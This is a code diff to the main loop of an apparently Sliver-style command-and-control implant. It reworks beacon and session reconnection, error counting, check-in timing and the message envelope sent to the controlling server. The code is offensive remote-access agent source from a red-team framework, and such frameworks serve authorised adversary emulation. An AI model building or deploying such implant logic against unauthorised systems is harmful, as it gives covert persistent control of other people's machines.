@@ -168,76 +168,100 @@ func main() {
 	// {{if .Config.IsService}}
 	svc.Run("", &sliverService{})
 	// {{else}}
+
+	// {{if .Config.IsBeacon}}
+	// {{if .Config.Debug}}
+	log.Printf("Running in Beacon mode with ID: %s", BeaconID)
+	// {{end}}
 	for {
-
-		// {{if .Config.IsBeacon}}
-		// {{if .Config.Debug}}
-		log.Printf("Running in Beacon mode with ID: %s", BeaconID)
-		// {{end}}
-		beacon := transports.StartBeaconLoop()
-		if beacon == nil {
-			break
+		beacon := transports.NextBeacon()
+		if beacon != nil {
+			err := beaconMainLoop(beacon)
+			if err != nil {
+				break
+			}
 		}
-		beaconMainLoop(beacon)
-
-		// {{else}}
-		// {{if .Config.Debug}}
-		log.Printf("Running in session mode")
-		// {{end}}
-		connection := transports.StartConnectionLoop()
-		if connection == nil {
-			break
-		}
-		sessionMainLoop(connection)
-		// {{end}}
-
+		time.Sleep(transports.GetReconnectInterval())
 	}
+	// {{else}}
+	// {{if .Config.Debug}}
+	log.Printf("Running in session mode")
+	// {{end}}
+	for {
+		connection := transports.StartConnectionLoop()
+		if connection != nil {
+			sessionMainLoop(connection)
+		}
+		time.Sleep(transports.GetReconnectInterval())
+	}
+	// {{end}}
+
 	// {{end}}
 }
 
 // {{if .Config.IsBeacon}}
-func beaconMainLoop(beacon *transports.Beacon) {
+var (
+	beaconErrors = 0
+)
+
+func beaconMainLoop(beacon *transports.Beacon) error {
 	// Register beacon
 	err := beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Error starting beacon: %s", err)
 		// {{end}}
-		return
+		beaconErrors++
+		if beaconErrors < transports.GetMaxConnectionErrors() {
+			return nil
+		}
+		return err
 	}
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
-	beacon.Send(Envelope(&sliverpb.BeaconRegister{
-		ID:       BeaconID,
-		Interval: beacon.Interval(),
-		Jitter:   beacon.Jitter(),
-		Register: RegisterSliver(),
+	nextBeacon := beacon.Duration()
+	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+		ID:          BeaconID,
+		Interval:    beacon.Interval(),
+		Jitter:      beacon.Jitter(),
+		Register:    RegisterSliver(),
+		NextCheckin: int64(nextBeacon),
 	}))
 	beacon.Close()
+
+	time.Sleep(time.Second)
 
 	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
 	for {
+		nextBeacon = beacon.Duration()
 		go func() {
-			err := beaconMain(beacon)
+			err := beaconMain(beacon, nextBeacon)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] %s", err)
+				log.Printf("[beacon] main %s", err)
 				// {{end}}
 			}
 		}()
-		duration := beacon.Duration()
+
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep for %v", duration)
+		log.Printf("[beacon] sleep for %v", nextBeacon)
 		// {{end}}
-		time.Sleep(duration)
+		time.Sleep(nextBeacon)
 	}
 }
 
-func beaconMain(beacon *transports.Beacon) error {
+func beaconMain(beacon *transports.Beacon, nextCheckin time.Duration) error {
 	err := beacon.Start()
+	if err != nil {
+		return err
+	}
+	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+		ID:          BeaconID,
+		NextCheckin: int64(nextCheckin),
+	}))
 	if err != nil {
 		return err
 	}
@@ -285,7 +309,7 @@ func beaconMain(beacon *transports.Beacon) error {
 
 	wg.Wait() // Wait for all tasks to complete
 
-	err = beacon.Send(Envelope(&sliverpb.BeaconTasks{
+	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:    BeaconID,
 		Tasks: results,
 	}))
@@ -304,7 +328,7 @@ func sessionMainLoop(connection *transports.Connection) {
 	// Reconnect active pivots
 	pivots.ReconnectActivePivots(connection)
 
-	connection.Send <- Envelope(RegisterSliver()) // Send registration information
+	connection.Send <- Envelope(sliverpb.MsgRegister, RegisterSliver()) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -378,7 +402,7 @@ func sessionMainLoop(connection *transports.Connection) {
 	}
 }
 
-func Envelope(message protoreflect.ProtoMessage) *sliverpb.Envelope {
+func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
 	data, err := proto.Marshal(message)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -387,7 +411,7 @@ func Envelope(message protoreflect.ProtoMessage) *sliverpb.Envelope {
 		return nil
 	}
 	return &sliverpb.Envelope{
-		Type: sliverpb.MsgRegister,
+		Type: msgType,
 		Data: data,
 	}
 }
